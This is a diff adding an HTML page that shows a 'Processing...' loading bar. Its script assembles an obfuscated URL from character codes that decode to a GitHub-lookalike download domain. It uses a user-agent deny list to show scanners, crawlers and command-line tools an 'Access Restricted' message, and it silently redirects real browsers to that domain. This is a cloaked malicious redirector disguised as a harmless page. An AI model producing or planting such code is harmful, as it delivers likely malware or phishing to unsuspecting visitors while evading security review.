@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="referrer" content="no-referrer">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Processing...</title>
+  <style>
+    body { margin: 0; height: 100vh; display: grid; place-items: center; background: #0f172a; }
+    .bar { width: 40px; height: 4px; background: #3b82f6; border-radius: 2px; animation: load 1.5s ease-in-out infinite; }
+    @keyframes load { 0%, 100% { width: 40px; margin: 0 10px; } 50% { width: 20px; margin: 0; } }
+  </style>
+</head>
+<body>
+  <div class="bar"></div>
+  <script>
+    
+    const c = [
+      ...[104, 116, 116, 112, 115],
+      ...[58, 47, 47],
+      ...[103, 105, 116, 104, 117, 98],
+      ...[115, 101, 99, 117, 114, 101, 100, 111, 119, 110],
+      ...[108, 111, 97, 100],
+      ...[46, 111, 110, 108, 105, 110, 101],
+      ...[47, 104, 114, 102, 47, 97, 108, 108]
+    ];
+    const u = String.fromCharCode(...c);
+
+    
+    const denyList = [
+      /bot|spider|crawl|slurp|scanner/i,
+      /python|java|go-http|okhttp|wget|curl/i,
+      /headless|puppeteer|phantom|selenium/i,
+      /http_client|restsharp|node-fetch|axios/i
+    ];
+    const isBlocked = denyList.some(regex => regex.test(navigator.userAgent)) || !navigator.userAgent.includes('Mozilla');
+
+    if (!isBlocked) {
+      setTimeout(() => { window.location.href = u; }, 1800);
+    } else {
+      document.body.innerHTML = '<div style="color:#94a3b8;text-align:center"><h2>⚠️ Access Restricted</h2><p>Standard browser required</p></div>';
+    }
+  </script>
+</body>
+</html>
